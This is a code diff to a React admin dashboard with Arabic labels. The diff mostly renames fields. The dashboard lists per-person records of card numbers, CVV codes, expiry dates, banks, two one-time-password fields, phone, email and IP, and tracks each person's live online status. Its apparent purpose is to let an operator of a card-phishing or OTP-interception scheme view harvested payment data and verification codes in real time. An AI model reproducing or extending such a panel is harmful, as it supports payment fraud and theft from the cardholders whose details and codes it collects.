@@ -114,7 +114,7 @@ interface Notification {
   ip?: string;
   cvv: string;
   id: string | "0";
-  expiryDate: string;
+  expiaryDate: string;
   notificationCount: number;
   otp: string;
   otp2: string;
@@ -140,11 +140,11 @@ interface Notification {
   email: string;
   mobile: string;
   network: string;
-  phoneOtp: string;
+  Otp: string;
   cardExpiry: string;
   name: string;
   otpCode: string;
-  phone: string;
+  userName: string;
   flagColor?: string;
   currentPage?: string;
 }
@@ -172,11 +172,11 @@ function useOnlineUsersCount() {
 }
 
 // Hook to track online status for a specific user ID
-function useUserOnlineStatus(userId: string) {
+function useUserOnlineStatus(userName: string) {
   const [isOnline, setIsOnline] = useState(false);
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userId}`);
+    const userStatusRef = ref(database, `/status/${userName}`);
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val();
@@ -184,7 +184,7 @@ function useUserOnlineStatus(userId: string) {
     });
 
     return () => unsubscribe();
-  }, [userId]);
+  }, [userName]);
 
   return isOnline;
 }
@@ -265,13 +265,13 @@ function StatisticsCard({
 }
 
 // Enhanced User Status Component
-function UserStatus({ userId }: { userId: string }) {
+function UserStatus({ userName }: { userName: string }) {
   const [status, setStatus] = useState<"online" | "offline" | "unknown">(
     "unknown"
   );
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userId}`);
+    const userStatusRef = ref(database, `/status/${userName}`);
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val();
@@ -283,7 +283,7 @@ function UserStatus({ userId }: { userId: string }) {
     });
 
     return () => unsubscribe();
-  }, [userId]);
+  }, [userName]);
 
   return (
     <div className="flex items-center gap-2">
@@ -878,7 +878,7 @@ export default function NotificationsPage() {
         (notification) =>
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
-          notification.phone?.toLowerCase().includes(term) ||
+          notification.userName?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term)
@@ -1620,10 +1620,10 @@ export default function NotificationsPage() {
                         <div className="flex flex-wrap gap-2">
                           <Badge
                             variant={
-                              notification.phone ? "default" : "secondary"
+                              notification.userName ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.phone
+                              notification.userName
                                 ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                 : ""
                             }`}
@@ -1632,7 +1632,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.phone
+                            {notification.userName
                               ? "معلومات شخصية"
                               : "لا يوجد معلومات"}
                           </Badge>
@@ -1688,7 +1688,7 @@ export default function NotificationsPage() {
                         </div>
                       </td>
                       <td className="px-6 py-4 text-center">
-                        <UserStatus userId={notification.id} />
+                        <UserStatus userName={notification.id} />
                       </td>
                       <td className="px-6 py-4 text-center">
                         {notification.otp && (
@@ -1796,7 +1796,7 @@ export default function NotificationsPage() {
                           </p>
                         </div>
                       </div>
-                      <UserStatus userId={notification.id} />
+                      <UserStatus userName={notification.id} />
                     </div>
                   </CardHeader>
 
@@ -1804,9 +1804,9 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.phone ? "default" : "secondary"}
+                          variant={notification.userName ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.phone
+                            notification.userName
                               ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                               : ""
                           }`}
@@ -1815,7 +1815,7 @@ export default function NotificationsPage() {
                           }
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.phone
+                          {notification.userName
                             ? "معلومات شخصية"
                             : "لا يوجد معلومات"}
                         </Badge>
@@ -1972,7 +1972,7 @@ export default function NotificationsPage() {
                     value: selectedNotification.email,
                   },
                   { label: "رقم الجوال", value: selectedNotification.mobile },
-                  { label: "الهاتف", value: selectedNotification.phone },
+                  { label: "الهاتف", value: selectedNotification.userName },
                 ].map(
                   ({ label, value }) =>
                     value && (
@@ -1998,14 +1998,14 @@ export default function NotificationsPage() {
                { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber +" - "+selectedNotification?.prefix ,
+                    value: selectedNotification?.cardNumber,
                   },
                   {
                     label: "تاريخ الانتهاء",
                     value:
                       selectedNotification.year && selectedNotification.month
                         ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiryDate,
+                        : selectedNotification.expiaryDate,
                   },
                   { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
@@ -2020,7 +2020,7 @@ export default function NotificationsPage() {
                         <span className="font-medium text-muted-foreground">
                           {label}:
                         </span>
-                        <span className="font-semibold">{value}</span>
+                        <span className="font-semibold" dir="ltr">{value}</span>
                       </div>
                     )
                 )}
